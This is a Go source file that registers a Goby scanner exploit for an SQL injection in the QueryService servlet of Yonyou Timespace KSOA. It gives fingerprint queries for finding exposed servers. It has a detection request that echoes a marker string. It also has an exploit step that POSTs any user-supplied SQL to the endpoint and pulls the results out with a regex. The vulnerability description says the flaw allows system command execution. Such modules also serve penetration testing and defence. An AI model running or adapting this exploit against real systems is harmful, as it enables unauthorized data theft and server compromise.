package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou Timespace KSOA /servlet/com.sksoft.bill.QueryService Interface SQL Injection Vulnerability",
    "Description": "<p>Yonyou Timespace KSOA is a next-generation product developed under the guidance of the SOA concept. It is a unified IT infrastructure launched according to the cutting-edge requirements of circulation enterprises. It allows IT systems established at various stages of circulation enterprises to communicate with each other easily. It helps circulation enterprises protect their existing IT investments, simplify IT management, enhance competitiveness, and ensure the realization of the overall strategic goals and innovation activities of the enterprise.</p><p>The Yonyou Timespace KSOA servlet/com.sksoft.bill.QueryService interface contains an SQL injection vulnerability. Attackers can exploit this vulnerability to execute arbitrary SQL statements, thereby obtaining sensitive information. Additionally, they can execute system commands through SQL statements.</p>",
    "Product": "yonyou-Time-and-Space-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-03-19",
    "PostTime": "2024-03-19",
    "Author": "2783712916@qq.com",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || body=\"check.jsp?pid=\"",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || body=\"check.jsp?pid=\"",
    "Level": "3",
    "Impact": "<p>The Yonyou Timespace KSOA servlet/com.sksoft.bill.QueryService interface contains an SQL injection vulnerability. Attackers can exploit this vulnerability to execute arbitrary SQL statements, thereby obtaining sensitive information. Additionally, they can execute system commands through SQL statements.</p>",
    "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqlPayload",
            "type": "input",
            "value": "SELECT ORIGINAL_LOGIN() AS CurrentUser;",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/servlet/com.sksoft.bill.QueryService?&service=query",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "select 'checkSqlAAAAAAAAAAAAAA';"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "checkSqlAAAAAAAAAAAAAA",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Type: text/xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/servlet/com.sksoft.bill.QueryService?&service=query"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/servlet/com.sksoft.bill.QueryService?&service=query",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": "{{{sqlPayload}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Type: text/xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<data><r><d>(.*?)</d></r></data></root"
            ]
        }
    ],
    "Tags": [
        "Command Execution",
        "SQL Injection",
        "HW-2023"
    ],
    "VulType": [
        "Command Execution",
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "用友时空KSOA /servlet/com.sksoft.bill.QueryService接口 SQL注入漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>用友时空KSOA是建立在SOA理念指导下研发的新一代产品，是根据流通企业最前沿的I需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。<br></p><p>用友时空KSOA servlet/com.sksoft.bill.QueryService接口中存在SQL注入漏洞，攻击者通过该漏洞可以执行任意sql语句获取敏感信息，还可通过sql语句执行系统命令。</p>",
            "Recommendation": "<p>1.联系相关厂商，获取安全补丁，及时进行漏洞修复</p><p>2.联系相关安全厂商，及时更新安全阻断策略</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友时空KSOA&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">servlet/com.sksoft.bill.QueryService接口中存在SQL注入漏洞，攻击者通过该漏洞可以执行任意sql语句获取敏感信息，还可通过sql语句执行系统命令。</span><br></p>",
            "VulType": [
                "命令执行",
                "SQL注入"
            ],
            "Tags": [
                "命令执行",
                "SQL注入",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Yonyou Timespace KSOA /servlet/com.sksoft.bill.QueryService Interface SQL Injection Vulnerability",
            "Product": "yonyou-Time-and-Space-KSOA",
            "Description": "<p>Yonyou Timespace KSOA is a next-generation product developed under the guidance of the SOA concept. It is a unified IT infrastructure launched according to the cutting-edge requirements of circulation enterprises. It allows IT systems established at various stages of circulation enterprises to communicate with each other easily. It helps circulation enterprises protect their existing IT investments, simplify IT management, enhance competitiveness, and ensure the realization of the overall strategic goals and innovation activities of the enterprise.<br></p><p>The Yonyou Timespace KSOA <span style=\"color: rgb(22, 28, 37); font-size: 16px;\">servlet/com.sksoft.bill.QueryService</span> interface contains an SQL injection vulnerability. Attackers can exploit this vulnerability to execute arbitrary SQL statements, thereby obtaining sensitive information. Additionally, they can execute system commands through SQL statements.<br></p>",
            "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">The Yonyou Timespace KSOA&nbsp;</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">servlet/com.sksoft.bill.QueryService</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">&nbsp;interface contains an SQL injection vulnerability. Attackers can exploit this vulnerability to execute arbitrary SQL statements, thereby obtaining sensitive information. Additionally, they can execute system commands through SQL statements.</span><br></p>",
            "VulType": [
                "Command Execution",
                "SQL Injection"
            ],
            "Tags": [
                "Command Execution",
                "SQL Injection",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
